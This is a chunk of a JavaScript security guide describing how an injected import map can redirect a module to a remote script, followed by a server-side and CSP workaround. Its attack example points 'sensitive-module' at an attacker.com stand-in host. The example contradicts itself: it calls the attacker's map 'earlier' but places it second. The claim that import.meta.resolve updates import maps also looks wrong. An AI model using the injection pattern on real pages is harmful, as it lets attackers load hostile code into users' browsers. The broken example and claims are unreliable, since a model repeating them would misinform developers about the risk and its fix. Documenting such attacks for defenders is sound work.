---
source: "languages/javascript/import-maps-attacks.md"
title: "Import Maps Security Risks"
heading: "Attack Vector 4: Dynamic Import Map Overwriting"
category: "language-vuln"
language: "javascript"
severity: "medium"
tags: [attack, javascript, language-vuln, overview, vector]
chunk: 6/11
---

## Attack Vector 4: Dynamic Import Map Overwriting

### The Problem

Import maps can be updated at runtime using `import.meta.resolve` resolution, but they cannot be easily protected from overwriting once the page loads. Multiple `<script type="importmap">` blocks on the same page can conflict.

### The Rule

Per the HTML spec, **only the first import map** on a page is used. However, this can be exploited:

```html
<!-- Legitimate import map from app -->
<script type="importmap">
{
  "imports": {
    "sensitive-module": "/js/sensitive.js"
  }
}
</script>

<!-- Attacker injects an EARLIER import map -->
<script type="importmap">
{
  "imports": {
    "sensitive-module": "http://attacker.com/malicious.js"
  }
}
</script>
<!-- Only the FIRST import map is used, so if attacker injects theirs first,
     the legitimate one is ignored -->
```

### Workarounds

```html
<!-- Protection: Generate import maps server-side and inject early in <head> -->
<head>
  <!-- Your import map MUST be first -->
  <script type="importmap">
  {
    "imports": {
      "my-app": "/js/app.js"
    }
  }
  </script>
  
  <!-- CSP should block additional import map injection -->
  <meta http-equiv="Content-Security-Policy" content="
    script-src 'nonce-abc123';
  ">
</head>
```

---